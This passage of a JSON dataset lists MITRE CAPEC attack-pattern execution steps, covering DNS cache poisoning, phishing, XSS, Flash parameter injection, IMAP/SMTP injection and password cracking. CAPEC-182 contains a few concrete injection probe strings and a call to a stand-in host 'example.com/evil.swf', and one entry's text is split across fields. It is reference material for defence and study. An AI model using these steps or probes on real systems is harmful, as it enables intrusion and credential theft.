        "step3": " [Create hostile service] The adversary creates a hostile service that will deliver content to the client-side application. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - If the client-side application is a browser, the adversary will create a service that delivers a malicious webpage to the browser.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary delivers the content to the client-side application using the hostile service and overflows the buffer.. - If the adversary is targeting a local client-side application, they just need to use the service themselves.. - If the adversary is attempting to cause an overflow on an external user's client-side application, they must get the user to attach to their service by some other means. This could be getting a user to visit their hostile webpage to target a user's browser.\n"
    },
    {
        "id": 45,
        "capec_id": "140"
    },
    {
        "id": 46,
        "capec_id": "141",
        "step1": " [Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.. - Run tools that check available entries in the cache. ",
        "step2": " [Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.. - Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID). ",
        "step3": " [Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, they are able to manipulate and interpose malicious response data to targeted victim queries.. - Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).. - Adversary-in-the-Middle attacks (CAPEC-94) intercept secure communication between two parties.\n"
    },
    {
        "id": 47,
        "capec_id": "142",
        "step1": " [Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.. - Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.. - Figure out if the client's browser has DNS cache enabled. ",
        "step2": " [Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.. - Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.. - If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction. - Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address. ",
        "step3": " [Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.. - Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.. - Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties.\n"
    },
    {
        "id": 48,
        "capec_id": "143",
        "step1": " [Find target web site] An adversary finds a target web site that they think may have unpublicized web pages ",
        "step2": " [Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree. - Use Dirbuster to brute force directories and file names to find unpublicized pages. - Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked ",
        "step3": " [Try to find weaknesses or information] The adversary will try to find weaknesses or information on the unpublicized pages that the targeted site did not intend to be public. - Manually analyze files or pages for information that could be useful in a further attack. - Use a static analysis tool to find weaknesses in unpublished web pages ",
        "step4": " [Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack.\n"
    },
    {
        "id": 49,
        "capec_id": "144",
        "step1": " [Find target web site] An adversary finds a target web site that they think may have unpublicized web services ",
        "step2": " [Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree. - Use Dirbuster to brute force directories and file names to find unpublicized web services. - Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked ",
        "step3": " [Try to find weaknesses or information] The adversary will try to find weaknesses in the unpublicized services that the targeted site did not intend to be public. - Use Nikto to look for web service vulnerabilities ",
        "step4": " [Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack.\n"
    },
    {
        "id": 50,
        "capec_id": "145"
    },
    {
        "id": 51,
        "capec_id": "146",
        "step1": " [Determine if XML schema is local or remote] Because this attack differs slightly if the target uses remote XML schemas versus local schemas, the adversary first needs to determine which of the two are used. ",
        "step2": " [Gain access to XML schema] The adversary gains access to the XML schema so that they can modify the contents.. - For a local scenario, the adversary needs access to the machine that the schema is located on and needs to gain permissions to alter the contents of the file.. - For a remote scenario, the adversary needs to be able to sniff HTTP traffic that contains an XML schema. ",
        "step3": " [Poison XML schema] Once the adversary gains access to the XML schema, they will alter it to achieve a desired effect. Locally, they can simply modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.. - Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data.. - Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.. - Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).\n"
    },
    {
        "id": 52,
        "capec_id": "147",
        "step1": " [Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.. - Use an automated tool to record all instances of URLs to process XML requests.. - Use a browser to manually explore the website and analyze how the application processes XML requests. ",
        "step2": " [Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.. - Send a large number of crafted small XML messages to the target URL.\n"
    },
    {
        "id": 53,
        "capec_id": "148"
    },
    {
        "id": 54,
        "capec_id": "149"
    },
    {
        "id": 55,
        "capec_id": "15",
        "step1": " [Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.. - Port mapping using network connection-based software (e.g., nmap, nessus, etc.). - Port mapping by exploring the operating system (netstat, sockstat, etc.). - TCP/IP Fingerprinting. - Induce errors to find informative error messages ",
        "step2": " [Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user. - Spidering web sites for all available links. - Inventory all application inputs ",
        "step3": " [Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.. - Inject command delimiters using network packet injection tools (netcat, nemesis, etc.). - Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.). - Enter command delimiters directly in input fields. ",
        "step4": " [Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software.\n"
    },
    {
        "id": 56,
        "capec_id": "150"
    },
    {
        "id": 57,
        "capec_id": "151"
    },
    {
        "id": 58,
        "capec_id": "153"
    },
    {
        "id": 59,
        "capec_id": "154"
    },
    {
        "id": 60,
        "capec_id": "155",
        "step1": " [Look for temporary files in target application] An adversary will try to discover temporary files in a target application. Knowledge of where the temporary files are being stored is important information. ",
        "step2": " [Attempt to read temporary files] An adversary will attempt to read any temporary files they may have discovered through normal means.. - Attempt to get the file by querying the file path to a web server. - Using a remote shell into an application, read temporary files and send out information remotely if necessary. - Recover temporary information from a user's browser cache ",
        "step3": " [Use function weaknesses to gain access to temporary files] If normal means to read temporary files did not work, an adversary will attempt to exploit weak temporary file functions to gain access to temporary files.. - Some C functions such as tmpnam(), tempnam(), and mktemp() will create a temporary file with a unique name, but do not stop an adversary from creating a file of the same name before it is opened by the application. Because these functions do not create file names that are sufficiently random, an adversary will try to make a file of the same name, causing a collision, and possibly altering file permissions for the temporary file so that it is able to be read.. - Similar to the last technique, an adversary might also create a file name collision using a linked file in a unix system such that the temporary file contents written out by the application write to a file of the adversaries choosing, allowing them to read the file contents.\n"
    },
    {
        "id": 61,
        "capec_id": "157",
        "step1": " [Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.. - Look for application documentation that might describe a communication mechanism used by a target. ",
        "step2": " [Position In Between Targets] The adversary positions themselves somewhere in the middle of the two components. If the communication is encrypted, the adversary will need to act as a proxy and route traffic between the components, exploiting a flaw in the encryption mechanism. Otherwise, the adversary can just observe the communication at either end.. - Use Wireshark or some other packet capturing tool to capture traffic on a network.. - Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.. - Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL. ",
        "step3": " [Listen to Communication] The adversary observes communication, but does not alter or block it. The adversary gains access to sensitive information and can potentially utilize this information in a malicious way.\n"
    },
    {
        "id": 62,
        "capec_id": "158"
    },
    {
        "id": 63,
        "capec_id": "159",
        "step1": " [Identify Target] The adversary identifies the target application and determines what libraries are being used.. - Find public source code and identify library dependencies.. - Gain access to the system hosting the application and look for libraries in common locations. ",
        "step2": " [Deploy Malicious Libraries] The adversary crafts malicious libraries and deploys them on the system where the application is running, or in a remote location that can be loaded by the application. ",
        "step3": " [Redirect Library Calls to Malicious Library] Once the malicious library crafted by the adversary is deployed, the adversary will manipulate the flow of the application such that it calls the malicious library. This can be done in a variety of ways based on how the application is loading and calling libraries.. - Poison the DNS cache of the system so that it loads a malicious library from a remote location hosted by the adversary instead of the legitimate location. - Create a symlink that tricks the application into thinking that a malicious library is the legitimate library.. - Use DLL side-loading to place a malicious verison of a DLL in the windows directory.\n"
    },
    {
        "id": 64,
        "capec_id": "16",
        "step1": " [Determine application's/system's password policy] Determine the password policies of the target application/system.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks). ",
        "step2": " [Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.). - Select dictionary based on particular users' preferred languages.. - Select dictionary based on the application/system's supported languages. ",
        "step3": " [Determine username(s) to target] Determine username(s) whose passwords to crack.. - Obtain username(s) by sniffing network packets.. - Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not). - Obtain usernames from filesystem (e.g. list of directories in C:Documents and Settings in Windows, and list in /etc/passwd in UNIX-like systems) ",
        "step4": " [Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.. - Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).. - Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).\n"
    },
    {
        "id": 65,
        "capec_id": "160",
        "step1": " [Identify API] Discover an API of interest by exploring application documentation or observing responses to API calls. - Search via internet for known, published APIs that support scripting instructions as arguments ",
        "step2": " [Test simple script] Adversaries will attempt to give a smaller script as input to the API, such as simply printing to the console, to see if the attack is viable.. - Create a general script to be taken as input by the API ",
        "step3": " [Give malicious scripting instructions to API] Adversaries will now craft custom scripts to do malicious behavior. Depending on the setup of the application this script could be run with user or admin level priveleges.. - Crafting a malicious script to be run on a system based on priveleges and capabilities of the system.\n"
    },
    {
        "id": 66,
        "capec_id": "161"
    },
    {
        "id": 67,
        "capec_id": "162",
        "step1": " [Probe target web application] The adversary first probes the target web application to find all possible pages that can be visited on the website.. - Use a spidering tool to follow and record all links. - Use a proxy tool to record all links visited during a manual traversal of the web application. ",
        "step2": " [Find hidden fields] Once the web application has been traversed, the adversary looks for all hidden HTML fields present in the client-side.. - Use the inspect tool on all modern browsers and filter for the keyword hidden. - Specifically look for hidden fields inside form elements. ",
        "step3": " [Send modified hidden fields to server-side] Once the adversary has found hidden fields in the client-side, they will modify the values of these hidden fields one by one and then interact with the web application so that this data is sent to the server-side. The adversary observes the response from the server to determine if the values of each hidden field are being validated. ",
        "step4": " [Manipulate hidden fields] Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.. - Manipulate a hidden field inside a form element and then submit the form so that the manipulated data is sent to the server.\n"
    },
    {
        "id": 68,
        "capec_id": "163",
        "step1": " [Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.. - Conduct web searching research of target. See also: CAPEC-118.. - Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.. - Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.. - Collect social information via dumpster diving. See also: CAPEC-406.. - Collect social information via traditional sources. See also: CAPEC-118.. - Collect social information via Non-traditional sources. See also: CAPEC-118. ",
        "step2": " [Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.. - Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).. - Optionally obtain a legitimate SSL certificate for the new domain name. ",
        "step3": " [Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.. - Use spidering software to get copy of web pages on legitimate site.. - Manually save copies of required web pages from legitimate site.. - Create new web pages that have the legitimate site's look at feel, but contain completely new content. ",
        "step4": " [Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has their website which duplicates a legitimate website, they need to build very custom user related information in it. For example, they could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.. - Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim. ",
        "step5": " [Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.. - Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.. - Place phishing link in post to online forum. ",
        "step6": " [Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.. - Log in to the legitimate site using another user's supplied credentials.\n"
    },
    {
        "id": 69,
        "capec_id": "164",
        "step1": " [Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.. - Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L). - Optionally obtain a legitimate SSL certificate for the new domain name. ",
        "step2": " [Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.. - Use spidering software to get copy of web pages on legitimate site.. - Manually save copies of required web pages from legitimate site.. - Create new web pages that have the legitimate site's look and feel, but contain completely new content. ",
        "step3": " [Convince user to enter sensitive information on adversary's site.] An adversary sends a text message to the victim that has a call-to-action, in order to persuade the user into clicking the included link (which then takes the victim to the adversary's website) and logging in. The key is to get the victim to believe that the text message originates from a legitimate entity with which the victim does business and that the website pointed to by the URL in the text message is the legitimate website. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.. - Send the user a message from a spoofed legitimate-looking mobile number that asks the user to click on the included link. ",
        "step4": " [Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.. - Log in to the legitimate site using another user's supplied credentials.\n"
    },
    {
        "id": 70,
        "capec_id": "165"
    },
    {
        "id": 71,
        "capec_id": "166"
    },
    {
        "id": 72,
        "capec_id": "167"
    },
    {
        "id": 73,
        "capec_id": "168"
    },
    {
        "id": 74,
        "capec_id": "169",
        "step1": " [Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.. - Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.. - Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.. - DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.. - Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.\n"
    },
    {
        "id": 75,
        "capec_id": "17",
        "step1": " [Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.. - Through shell access to a system, use the command ls -l to view permissions for files and directories. ",
        "step2": " [Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.. - Upload a malicious file through a misconfigured FTP server. ",
        "step3": " [Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary.\n"
    },
    {
        "id": 76,
        "capec_id": "170",
        "step1": " [Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.. - Use automated tools or send web server specific commands to web server and then receive server's response. ",
        "step2": " [Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.. - Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.. - Send bad requests or requests of nonexistent pages to the server.. - Attacker takes existing automated tools to recognize the type and the version of the web server in use. ",
        "step3": " [Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.. - Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.. - Examine the HTTP Response Headers. This may leak information about software signatures. - Examine Cookies that may contain server's software information.. - Check error pages. ",
        "step4": " [Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.. - Use tools to send bogus SQL query to the server and check error pages.\n"
    },
    {
        "id": 77,
        "capec_id": "171"
    },
    {
        "id": 78,
        "capec_id": "173"
    },
    {
        "id": 79,
        "capec_id": "174",
        "step1": " [Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, they list how to pass global parameters to the Flash file from the embedding object.. - Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.. - Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file. ",
        "step2": " [Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.. - When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.. - When the name of the Flash file is exposed as a form or a URL parameter, the adversary injects '?' and the payload after the file name in the URL to override some global value.. - When the arguments passed in the 'flashvars' attributes, the adversary injects '&' and payload in the URL.. - If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.. - If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded. ",
        "step3": " [Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.. - Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.\n"
    },
    {
        "id": 80,
        "capec_id": "175"
    },
    {
        "id": 81,
        "capec_id": "176"
    },
    {
        "id": 82,
        "capec_id": "177"
    },
    {
        "id": 83,
        "capec_id": "178",
        "step1": " [Identification] Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).. - Use an automated tool to record the variables passed to a flash file.. - Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.. - Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive. ",
        "step2": " [Attempt to inject a remote flash file] The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.. - Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file. ",
        "step3": " [Access or Modify Flash Application Variables] As the attacker succeeds in exploiting the vulnerability, they target the content of the flash application to steal variable content, password, etc.. - Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.. - Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately. ",
        "step4": " [Execute JavaScript in victim's browser] When the attacker targets the current flash application, they can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.. - Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.\n"
    },
    {
        "id": 84,
        "capec_id": "179"
    },
    {
        "id": 85,
        "capec_id": "18",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.. - Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).. - Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).. - Use a proxy tool to record results of the created requests. ",
        "step3": " [Create malicious XSS content] Once the adversary has determined which entry points are vulnerable to XSS, they will interact with the web application to store the malicious content. Because of the nature of this attack, it is mostly carried out through stored XSS, although it is possible to perform this attack using reflected XSS. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.. - Store a malicious script on a page, disguised as a non-script element, that will execute when viewed by the victim.. - Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks. ",
        "step4": " [Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.. - Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.. - Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.\n"
    },
    {
        "id": 86,
        "capec_id": "180",
        "step1": " [Survey] The attacker surveys the target application, possibly as a valid and authenticated user.. - Spider the web site for all available links.. - Brute force to guess all function names/action with different privileges. ",
        "step2": " [Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.. - The attacker attempts authenticated access to targeted functions and data.. - The attacker attempts unauthenticated access to targeted functions and data.. - The attacker attempts indirect and side channel access to targeted functions and data. ",
        "step3": " [Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.. - The attacker executes the function or accesses the data not authorized to them.\n"
    },
    {
        "id": 87,
        "capec_id": "181"
    },
    {
        "id": 88,
        "capec_id": "182",
        "step1": " [Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.. - Spider the website for all available URLs that reference a Flash application.. - List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies. ",
        "step2": " [Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.. - Test the page using direct load asfunction, getURL,javascript:gotRoot()///d.jpg. - Test the page using controlled evil page/host, http://example.com/evil.swf. - Test the page using Flash HTML injection, '><img src='asfunction:getURL,javascript:gotRoot()//.jpg' >. - Test the page using DOM injection, (gotRoot('')) ",
        "step3": " [Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase.\n"
    },
    {
        "id": 89,
        "capec_id": "183",
        "step1": " [Identify Target Web-Mail Server] The adversary first identifies the web-mail server they wish to exploit. ",
        "step2": " [Identify Vulnerable Parameters] Once the adversary has identified a web-mail server, they identify any vulnerable parameters by altering their values in requests. The adversary knows that the parameter is vulnerable if the web-mail server returns an error of any sort. Ideally, the adversary is looking for a descriptive error message.. - Assign a null value to a parameter being used by the web-mail server and observe the response.. - Assign a random value to a parameter being used by the web-mail server and observe the response.. - Add additional values to a parameter being used by the web-mail server and observe the response.. - Add non standard special characters (i.e.: , ', , @, #, !, ",
        "step3": ") to a parameter being used by the web-mail server and observe the response.. - Eliminate a parameter being used by the web-mail server and observe the response. ",
        "step4": " [Determine Level of Injection] After identifying all vulnerable parameters, the adversary determines what level of injection is possible.. - Evaluate error messages to determine what IMAP/SMTP command is being executed for the vulnerable parameter. Sometimes the actually query will be placed in the error message.. - If there aren't descriptive error messages, the adversary will analyze the affected functionality to deduce the possible commands that could be being used by the mail-server. ",
        "step5": " [Inject IMAP/SMTP Commands] The adversary manipulates the vulnerable parameters to inject an IMAP/SMTP command and execute it on the mail-server.. - Structure the injection as a header, body, and footer. The header contains the ending of the expected message, the body contains the injection of the new command, and the footer contains the beginning of the expected command.. - Each part of the injection payload needs to be terminated with the CRLF (%0d%0a) sequence.\n"
    },
    {
        "id": 90,
        "capec_id": "184"
    },
    {
        "id": 91,
        "capec_id": "185"
    },
    {
        "id": 92,
        "capec_id": "186",
        "step1": " [Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users). ",
        "step2": " [Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.. - Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.. - Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update. - Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.. - Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.. - Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks. ",
        "step3": " [Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update.\n"
    },
    {
        "id": 93,
        "capec_id": "187"
    },
    {
        "id": 94,
        "capec_id": "188"
    },
    {
        "id": 95,
        "capec_id": "189"
    },
    {
        "id": 96,
        "capec_id": "19",
        "step1": " [Spider] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.. - Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.. - Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.. - Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.. - Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.. - Use a proxy tool to record results of the created requests. ",
        "step3": " [Steal session IDs, credentials, page content, etc.] As the adversary succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the adversary.. - Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute appropriately. ",
